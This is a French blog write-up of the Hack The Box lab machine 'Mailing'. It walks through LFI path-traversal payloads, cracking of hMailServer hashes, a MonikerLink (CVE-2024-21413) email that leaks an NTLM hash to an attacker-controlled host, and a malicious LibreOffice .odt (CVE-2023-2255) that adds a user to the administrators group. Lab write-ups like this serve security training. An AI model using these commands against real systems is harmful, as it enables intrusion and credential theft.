---
date: 2024-09-06T23:42:37-05:00
# description: ""
image: "/images/HTB-Mailing/Mailing.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Mailing"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Mailing](https://app.hackthebox.com/machines/Mailing)
* Niveau: Facile
* OS: Windows
---

Cette machine HackTheBox est centrée sur les vulnérabilités email. Après une reconnaissance initiale, nous exploitons une vulnérabilité LFI pour récupérer des hachages de mots de passe, dont un nous donne accès à un compte admin. En utilisant ensuite la vulnérabilité MonikerLink, nous obtenons un premier accès. L'escalade de privilèges se réalise en exploitant une configuration permettant l'exécution automatique de fichiers .odt, nous donnant ainsi les droits d'admin.

Adresse IP cible - `10.10.11.14`

## Balayage

```
nmap -sC -sV -oA nmap/Mailing 10.10.11.14
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 00:50 CDT
Nmap scan report for 10.10.11.14
Host is up (0.054s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL TOP USER
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: SORT IMAP4 IDLE OK QUOTA RIGHTS=texkA0001 CAPABILITY completed NAMESPACE IMAP4rev1 CHILDREN ACL
445/tcp open  microsoft-ds?
465/tcp open  ssl/smtp      hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
587/tcp open  smtp          hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
993/tcp open  ssl/imap      hMailServer imapd
|_imap-capabilities: SORT IMAP4 IDLE OK QUOTA RIGHTS=texkA0001 CAPABILITY completed NAMESPACE IMAP4rev1 CHILDREN ACL
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-09-07T05:51:14
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.70 seconds
```

Nous avons divers services tels que SMTP, POP3, HTTP, SMB, et IMAP en plus d'une redirection vers `mailing.htb` que nous ajoutons au fichier hosts.

```
sudo echo "10.10.11.14 mailing.htb" | sudo tee -a /etc/hosts
```

## Enumération

En visitant `http://mailing.htb/` nous trouvons un site web pour un service de courrier électronique sécurisé basé sur [hmailserver](https://www.hmailserver.com/).

![Mailing website](/images/HTB-Mailing/mailing-website.png)

La seule interaction sur le site est un bouton de téléchargement pour un fichier pdf détaillant les instructions pour le processus d'installation.

![Download instructions button](/images/HTB-Mailing/download_instructions.png)

Nous poursuivons le processus d'énumération, mais l'énumération des répertoires et des sous-domaines est infructueuse.

```
gobuster dir -u http://mailing.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u http://mailing.htb/ -H "Host: FUZZ.mailing.htb" -ic -fs 4681
```

Après avoir capturé la requête que nous obtenons avec le bouton "Download Instructions", nous remarquons le paramètre "file". S'il n'est pas correctement sécurisé, nous pourrions avoir une vulnérabilité LFI (Local File Inclusion).

![Mailing Download button request](/images/HTB-Mailing/download-request.png)

Avec wappalyzer, nous découvrons que l'application utilise `ASP.NET` avec `IIS` pour le serveur. Nous savons que le fichier `web.config` doit être présent à la racine du site web `C:\inetpub\wwwroot` pour que les applications `ASP.NET` fonctionnent correctement. Nous pouvons donc essayer de lire le contenu du fichier afin de confirmer notre LFI potentielle. *Plus d'infos [ici](https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config?view=aspnetcore-8.0#webconfig-file-location).*

![Mailing wappalyzer](/images/HTB-Mailing/wappalyzer.png)

Avec `../../inetpub/wwwroot/web.config` pour la valeur de `file`

![Mailing LFI test](/images/HTB-Mailing/IIS-web-config.png)

Nous obtenons une réponse positive et pouvons lire le fichier.

![Mailing web.config content](/images/HTB-Mailing/web-config-content.png)

L'étape suivante sera d'essayer de lire quelques fichiers sensibles. Nous savons que la cible utilise hmailserver donc nous nous concentrerons sur ce dernier, cherchons `hmailserver ini ile location` sur Google.

Ce [post](https://www.hmailserver.com/forum/viewtopic.php?t=29069) nous dit que par défaut le fichier ini est dans `C:\Program Files\MailServer\Bin` mais en utilisant `../../Program+Files/hMailServer/Bin/hMailServer.ini` pour le payload nous obtenons le résultat `File not found`.

Ce [forum]((https://www.hmailserver.com/forum/viewtopic.php?t=38903)) nous apprend que le fichier ini peut également se trouver dans `program files (x86)\hMailServer\Bin\hMailServer.ini`.

En utilisant le chemin `../../Program Files (x86)/hMailServer/Bin/hMailServer.ini` comme payload, nous parvenons à extraire des informations sensibles concernant le serveur de messagerie hMailServer en fonctionnement sur la machine cible.

![LFI for hmailserver INI file](/images/HTB-Mailing/INI-file.png)

![INI file - passwords found](/images/HTB-Mailing/INI-file-pwds.png)

Le fichier contient deux hachages de mots de passe, le mot de passe administrateur qui est `841bb5acfa6779ae432fd7a4e6600ba7` et un mot de passe utilisateur `0a9f8ad8bf896b501dde74f08efd7e4c`. Il révèle également les répertoires du logiciel et la base de données utilisée (MSSQL).

À l'aide de [CrackStation](https://crackstation.net/), nous trouvons le mot de passe de l'administrateur, `homenetworkingadministrator`.

![admin password](/images/HTB-Mailing/admin-pwd.png)

> Nous ne sommes pas en mesure de déchiffrer le deuxième hachage.

## Accès Initial

Nous pouvons utiliser Telnet pour tester la connexion POP3, les étapes sont expliquées [ici](https://www.resellerspanel.com/articles/cloud-web-hosting-articles/email/testing-incoming-mail-pop3-settings-via-telnet/).

```
telnet 10.129.59.26 110

USER administrator@mailing.htb
PASS homenetworkingadministrator
```

![POP3 mail box check](/images/HTB-Mailing/pop3-check.png)

La boîte aux lettres est vide, mais nous savons qu'il existe un serveur de messagerie avec authentification. Sur le site web, on peut lire: `Using any mail client you can connect to our server with your account with any system (Linux, MacOS or Windows)`.

La cible utilise Windows et donc très probablement Microsoft Outlook. L'une des vulnérabilités les plus récentes pour Outlook est [MonikerLink](https://blog.checkpoint.com/research/check-point-research-unveils-critical-monikerlink-vulnerability-in-microsoft-outlook-with-a-9-8-cvss-severity-score/), qui peut entraîner la fuite d'informations d'identification.

> Vous pouvez en appredre plus en consultant cette [room](https://tryhackme.com/r/room/monikerlink) sur TryhackMe.

A partir de là, nous trouvons un PoC pour cette vulnérabilité [ici](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability). Nous pouvons l'utiliser pour envoyer un email à un utilisateur valide et faire fuiter son hash NTLM.

> Après avoir lu les instructions PDF (disponibles en téléchargement sur le site web), nous découvrons que `maya@mailing.htb` est un utilisateur valide sur le serveur (page 16).

1. Lancer Responder 

```
sudo responder -I tun0
```

2. Envoyer l'email

```
python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url '\\MY_IP_ADDRESS\test' --subject Hi
```

![Email sent via PoC](/images/HTB-Mailing/email_sent_poc.png)

3. Craquer le hachage reçu avec Responder

![Hash obtained for maya](/images/HTB-Mailing/responder-hash.png)

```
hashcat -a 0 -m 5600 maya_hash.txt /usr/share/wordlists/rockyou.txt
```

![Maya password](/images/HTB-Mailing/maya-pwd.png)

Après avoir craqué le hash avec hashcat, nous récupérons le mot de passe `m4y4ngs4ri` et avec Evil-WinRM nous nous connectons en tant que Maya avec la commande ci-dessous.

```
evil-winrm -i TARGET_IP -u maya -p m4y4ngs4ri
```

Le fichier `user.txt` se trouve dans `C:\Users\maya\Desktop`.

![user flag location](/images/HTB-Mailing/user-flag.png)

## Elévation de Privilèges

Dans `C:\Users\maya\Documents` nous trouvons deux fichiers `mail.py` et `mail.vbs`. Ces deux scripts automatisent les interactions avec un client de messagerie (probablement Microsoft Outlook) en ouvrant les courriels non lus.

Puisque nous avons des scripts d'automatisation, ils doivent être configurés d'une certaine manière afin d'être exécutés. Nous pouvons trouver les tâches planifiées sous Windows avec l'outil de ligne de commande `schtasks`.

```
schtasks /query /fo LIST /v
```

Nous avons en effet des tâches liées à `mail.py` et `mail.vbs`. De plus, il existe une autre tâche appelée `Test` qui exécute un script PowerShell situé dans `C:\Users\localadmin\Documents\scripts\soffice.ps1`.

![Test scheduled task](/images/HTB-Mailing/Test-scheduled-task.png)

Malheureusement, nous ne pouvons pas accéder au contenu de `localadmin` faute de permissions.

![localadmin user, access denied](/images/HTB-Mailing/access-denied-localadmin.png)

Dans `Program Files` nous remarquons que `Libre Office` est installé. Cela mérite d'être souligné (du moins pour moi) car ce logiciel est généralement utilisé sur les systèmes Linux. Le fichier `readme_fr-US.txt` dans `C:\Program Files\libreOffice\readmes` révèle la version du logiciel.

![Libre Office version](/images/HTB-Mailing/LibreOffice-version.png)

Dans `C:\Program Files\LibreOffice\program` nous trouvons un script `soffice.ps1`.

```PowerShell
# Set the directory where the .odt files are located
$directory = "C:\Users\Public\Documents"

# Get all files with .odt extension in the specified directory
$files = Get-ChildItem -Path $directory -Filter *.odt

# Loop through each .odt file and open it
foreach ($file in $files) {
    Start-Process $file.FullName
}
```

Le script automatise le processus d'ouverture de tous les fichiers OpenDocument Text (`*.odt`) situés dans le répertoire spécifié.

En retournant à la version de LibreOffice, nous trouvons [ici](https://github.com/elweth-sec/CVE-2023-2255) un PoC pour CVE-2023-2255.

Sachant que les fichiers `.odt` sont automatiquement ouverts lorsqu'ils sont placés dans un certain répertoire, nous pouvons créer un fichier malveillant qui exécutera des commandes lorsqu'il sera ouvert. Nous allons créer un fichier pour ajouter `maya` au groupe des administrateurs. 

Nous ne trouvons pas le répertoire habituel `Administrators` dans `C:\Users`, à la place nous avons un utilisateur appelé `localadmin`. Avec `net user localadmin` nous confirmons qu'il fait partie du groupe des administrateurs appelé `Administradores` dans ce cas.

![localadmin membership](/images/HTB-Mailing/localadmin-memberships.png)

```
git clone https://github.com/elweth-sec/CVE-2023-2255

python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'
```

![Malicious odt file](/images/HTB-Mailing/malicious_odt_file.png)

Le fichier `.odt` malveillant est envoyé à la cible à l'aide d'un serveur SMB, mais après l'avoir placé dans `C:Users\Public\Documents`, rien ne se produit.

Après quelques recherches, un certain répertoire se démarque! Nous trouvons un répertoire appelé `Important Documents` dans `C:\`, en vérifiant ses permissions nous remarquons que les membres du groupe `Administradores` ont le contrôle total `(F)` sur le répertoire. De plus, Maya a également les permissions de modification `(M)` sur ce répertoire.

![Important Documents directory permissions](/images/HTB-Mailing/folder-permissions.png)

Plaçons-y notre fichier malveillant.

1. Lancer un serveur SMB 

```
impacket-smbserver mailing `pwd` -smb2support
```

2. Se connecter au serveur SMB avec l'utilisateur maya

```
net use \\MY_IP\mailing
```

3. Aller dans `C:\NImportant Documents` et télécharger le fichier malveillant

```
cd 'Important Documents'
copy \\MY_IP\mailing\exploit.odt
```

4. Attendre 1 à 2 minutes puis confirmez que Maya fait maintenant partie du groupe `Administradores` avec `net user maya`

![maya now part of admin group](/images/HTB-Mailing/maya_admin.png)

Déconnectez-vous d'Evil-WinRM et reconnectez-vous pour que le privilège prenne effet. Vous pouvez maintenant accéder à `C:\Users\localadmin\Desktop` où vous trouverez le fichier `root.txt`.

![Root flag](/images/HTB-Mailing/root-flag.png)

Merci d'avoir lu cet article, j'espère qu'il vous a été utile!
